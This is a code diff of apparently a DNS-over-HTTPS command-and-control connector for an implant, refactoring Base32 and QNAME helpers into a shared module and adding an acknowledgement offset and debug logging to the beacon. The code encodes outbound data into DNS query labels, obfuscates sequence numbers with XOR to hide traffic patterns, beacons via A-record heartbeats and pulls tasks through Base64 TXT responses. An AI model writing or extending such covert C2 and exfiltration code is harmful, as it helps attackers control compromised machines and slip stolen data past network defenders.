@@ -1,4 +1,5 @@
 #include "ConnectorDoH.h"
+#include "DnsUtils.h"
 #include "ApiDefines.h"
 #include "ProcLoader.h"
 #include "Crypt.h"
@@ -8,174 +9,7 @@
 
 extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);
 
-// -----------------------------------------------------------------------------
-// Helpers reused from ConnectorDNS (Base32, DNS Encoding)
-// -----------------------------------------------------------------------------
-
-static void ToHex32(ULONG value, CHAR out[9])
-{
-	static const CHAR hex[] = "0123456789abcdef";
-	for (int i = 7; i >= 0; --i) {
-		out[i] = hex[value & 0x0F];
-		value >>= 4;
-	}
-	out[8] = '\0';
-}
-
-static ULONG DnsBase32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dstSize)
-{
-	static const CHAR alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
-	ULONG bitBuffer = 0;
-	int   bitCount  = 0;
-	ULONG outLen    = 0;
-
-	for (ULONG i = 0; i < srcLen; ++i) {
-		bitBuffer = (bitBuffer << 8) | src[i];
-		bitCount += 8;
-		while (bitCount >= 5) {
-			bitCount -= 5;
-			if (outLen + 1 >= dstSize)
-				return 0;
-			ULONG index = (bitBuffer >> bitCount) & 0x1F;
-			dst[outLen++] = alphabet[index];
-		}
-	}
-
-	if (bitCount > 0) {
-		if (outLen + 1 >= dstSize)
-			return 0;
-		ULONG index = (bitBuffer << (5 - bitCount)) & 0x1F;
-		dst[outLen++] = alphabet[index];
-	}
-
-	if (outLen < dstSize)
-		dst[outLen] = '\0';
-	return outLen;
-}
-
-static void BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize)
-{
-    CHAR seqHex[9];
-    CHAR idxHex[9];
-    // XOR Obfuscation to hide incremental patterns
-    ToHex32(seq ^ 0x39913991, seqHex);
-    ToHex32(idx ^ 0x39913991, idxHex);
-
-	const CHAR* dataPart = (dataLabel && dataLabel[0]) ? dataLabel : "x";
-	const CHAR* domPart  = (domain && domain[0]) ? domain : "";
-
-	if (domPart[0])
-		_snprintf(out, outSize, "%s.%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart, domPart);
-	else
-		_snprintf(out, outSize, "%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart);
-}
-
-// Forward declaration so helpers can log before DohConnectorLog definition
-static void DohConnectorLog(const char* msg);
-
-static int EncodeDnsName(const CHAR* host, BYTE* buf, int bufSize)
-{
-	if (!host || !buf || bufSize <= 1)
-		return -1;
-
-	int len = 0;
-	const CHAR* p = host;
-	while (*p) {
-		// 计算当前 label 长度
-		const CHAR* labelStart = p;
-		int labelLen = 0;
-		while (*p && *p != '.') {
-			++p;
-			++labelLen;
-		}
-		if (labelLen == 0)
-			break;
-		if (labelLen > 63)
-			labelLen = 63; // 单个 label 最长 63 字节
-
-		// 检查: 1 字节长度 + labelLen + 终止 0 至少还要 1 字节
-		if (len + 1 + labelLen + 1 > bufSize)
-			return -1;
-
-		buf[len++] = (BYTE)labelLen;
-		memcpy(buf + len, labelStart, labelLen);
-		len += labelLen;
-
-		if (*p == '.')
-			++p;
-	}
-	// 加终止 0
-	if (len + 1 > bufSize)
-		return -1;
-	buf[len++] = 0;
-	return len;
-}
-
-static BOOL BuildDataLabelsFromBytes(const BYTE* src, ULONG srcLen, ULONG labelSize, CHAR* out, ULONG outSize)
-{
-	if (!src || !srcLen || !out || !labelSize || labelSize > 63 || outSize == 0)
-		return FALSE;
-
-	CHAR encoded[2048];
-	memset(encoded, 0, sizeof(encoded));
-	ULONG encLen = DnsBase32Encode(src, srcLen, encoded, sizeof(encoded));
-	if (encLen == 0)
-		return FALSE;
-
-	ULONG written = 0;
-	ULONG i = 0;
-	while (i < encLen) {
-		ULONG chunk = labelSize;
-		if (chunk > encLen - i)
-			chunk = encLen - i;
-		if (written + chunk + 1 >= outSize) // +1 for dot or NUL
-			return FALSE;
-		memcpy(out + written, encoded + i, chunk);
-		written += chunk;
-		i += chunk;
-		if (i < encLen) {
-			out[written++] = '.';
-		}
-	}
-	if (written >= outSize)
-		return FALSE;
-	out[written] = '\0';
-	return TRUE;
-}
-
-static int Base64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax)
-{
-    static const int decodeTable[] = {
-        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
-        52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
-        -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
-        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
-        -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
-        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1
-    };
-
-    int i = 0;
-    int j = 0;
-    int val = 0;
-    int valb = -8;
-
-    for (i = 0; i < srcLen; i++) {
-        unsigned char c = src[i];
-        if (c > 127) continue;
-        int d = decodeTable[c];
-        if (d == -1) continue;
-
-        val = (val << 6) | d;
-        valb += 6;
-        if (valb >= 0) {
-            if (j < dstMax) dst[j++] = (BYTE)((val >> valb) & 0xFF);
-            valb -= 8;
-        }
-    }
-    return j;
-}
+// DNS utility functions are now in DnsUtils.h/cpp
 
 // -----------------------------------------------------------------------------
 // ConnectorDoH Implementation
@@ -557,7 +391,7 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** ou
         return FALSE;
     }
 
-    	int nameLen = EncodeDnsName(qname, query + offset, kDnsQueryMax - offset - 4);
+    	int nameLen = DnsEncodeName(qname, query + offset, kDnsQueryMax - offset - 4);
     if (nameLen < 0) {
         this->functions->LocalFree(query);
         return FALSE;
@@ -1086,7 +920,7 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 				return;
 			memcpy(encBuf, data, maxBuf);
 			memset(dataLabel, 0, sizeof(dataLabel));
-			if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
+			if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
 				MemFreeLocal((LPVOID*)&encBuf, maxBuf);
 				return;
 			}
@@ -1100,7 +934,7 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 					memcpy(this->hiBeat, data, this->hiBeatSize);
 			}
 
-			BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+			DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
 			BYTE tmp[512];
 			ULONG tmpSize = 0;
 			if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
@@ -1160,13 +994,13 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			memcpy(frame + headerSize, data + offset, chunk);
 
 			memset(dataLabel, 0, sizeof(dataLabel));
-			if (!BuildDataLabelsFromBytes(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+			if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
 				MemFreeLocal((LPVOID*)&frame, frameSize);
 				return;
 			}
 			MemFreeLocal((LPVOID*)&frame, frameSize);
 
-			BuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+			DnsBuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
 			BYTE tmp[512];
 			ULONG tmpSize = 0;
 			DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
@@ -1202,13 +1036,13 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			return;
 		memcpy(encBuf, this->hiBeat, retrySize);
 		memset(dataLabel, 0, sizeof(dataLabel));
-		if (!BuildDataLabelsFromBytes(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+		if (!DnsBuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
 			MemFreeLocal((LPVOID*)&encBuf, retrySize);
 			return;
 		}
 		MemFreeLocal((LPVOID*)&encBuf, retrySize);
 
-		BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+		DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
 		BYTE tmp[512];
 		ULONG tmpSize = 0;
 		if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
@@ -1241,28 +1075,41 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	// mirrors ConnectorDNS::SendData hybrid A/TXT behavior:
 	//  - A(0.0.0.0) -> no tasks, return and let AgentMain sleep
 	//  - A(0.0.0.1) -> has tasks, fall through to TXT GET below
+	// ACK mechanism: encode downAckOffset in dataLabel to tell server which offset is confirmed.
 	if (!this->downBuf) {
 		CHAR qnameA[512];
-		BuildQName(this->sid, "api", this->seq + 1, this->idx, "", this->domain, qnameA, sizeof(qnameA));
+		// 编码 ACK offset 到 dataLabel：4字节 big-endian base32 编码
+		BYTE ackBytes[4];
+		ackBytes[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
+		ackBytes[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
+		ackBytes[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
+		ackBytes[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
+		CHAR ackLabel[16];
+		memset(ackLabel, 0, sizeof(ackLabel));
+		DnsBase32Encode(ackBytes, 4, ackLabel, sizeof(ackLabel));
+		DnsBuildQName(this->sid, "api", this->seq + 1, this->idx, ackLabel, this->domain, qnameA, sizeof(qnameA));
+		DnsDebugLogf("[DoH] HEARTBEAT(A): seq=%lu ack_offset=%lu", this->seq + 1, this->downAckOffset);
 		BYTE ipBuf[16];
 		ULONG ipSize = 0;
 		if (DohQueryA(qnameA, ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
 			if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
-				DohConnectorLog("[DoH] Heartbeat: no tasks (A=0.0.0.0), returning");
+				DnsDebugLog("[DoH] HEARTBEAT: no tasks (0.0.0.0)");
 				// No tasks: advance seq and return immediately.
 				this->seq++;
+				// 重置 ACK offset 因为没有待下载的任务
+				this->downAckOffset = 0;
 				return;
 			}
-			DohConnectorLog("[DoH] Heartbeat: tasks available (A!=0.0.0.0), will TXT GET");
-			// Non-zero IP: has tasks, fall through to TXT GET.
+			DnsDebugLogf("[DoH] HEARTBEAT: has tasks (IP=%u.%u.%u.%u)", 
+			             ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
 		} else {
 			// A-record heartbeat failed; skip TXT this round and retry later.
-			DohConnectorLog("[DoH] Heartbeat: DohQueryA failed or short, skipping TXT");
+			DnsDebugLog("[DoH] HEARTBEAT: A query FAILED");
 			return;
 		}
 	}
 
-	BuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
+	DnsBuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
 	// Larger buffers to safely hold big Base64-encoded TXT responses for multi-fragment
 	// downlink frames (e.g. 856-byte binary frames + 8-byte header -> ~1.2KB Base64).
 	BYTE respBuf[4096];
@@ -1275,9 +1122,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 
 		// Base64 decode the TXT response into binary chunk
 		BYTE binBuf[4096];
-		int binLen = Base64Decode((const CHAR*)respBuf, (int)respSize, binBuf, (int)sizeof(binBuf));
+		int binLen = DnsBase64Decode((const CHAR*)respBuf, (int)respSize, binBuf, (int)sizeof(binBuf));
 		if (binLen <= 0) {
-			DohConnectorLog("[DoH] Down: Base64Decode failed or empty");
+			DohConnectorLog("[DoH] Down: DnsBase64Decode failed or empty");
 			return; // invalid or empty payload
 		}
 
@@ -1342,14 +1189,11 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 				ULONG n = end - offset;
 				memcpy(this->downBuf + offset, binBuf + headerSize, n);
 				this->downFilled += n;
-				{
-					CHAR dbg2[160];
-					_snprintf(dbg2, sizeof(dbg2),
-						"[DoH] Down: after copy downFilled=%lu/%lu",
-						(unsigned long)this->downFilled,
-						(unsigned long)this->downTotal);
-					DohConnectorLog(dbg2);
-				}
+				// 更新 ACK offset - 记录已接收的最大连续 offset
+				this->downAckOffset = this->downFilled;
+				DnsDebugLogf("[DoH] GET: reassembly progress %lu/%lu (%.1f%%)", 
+				             this->downFilled, this->downTotal, 
+				             (float)this->downFilled * 100.0f / (float)this->downTotal);
 				if (this->downFilled >= this->downTotal) {
 					// Session header: [flags][orig_len_le], followed by payload
 					BYTE* finalBuf = this->downBuf;
@@ -1403,6 +1247,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 					this->downBuf = NULL;
 					this->downTotal = 0;
 					this->downFilled = 0;
+					// 重置 ACK offset，任务下载完成
+					this->downAckOffset = 0;
+					DnsDebugLogf("[DoH] GET: task ready, size=%lu bytes", finalSize);
 				}
 				return;
 			}
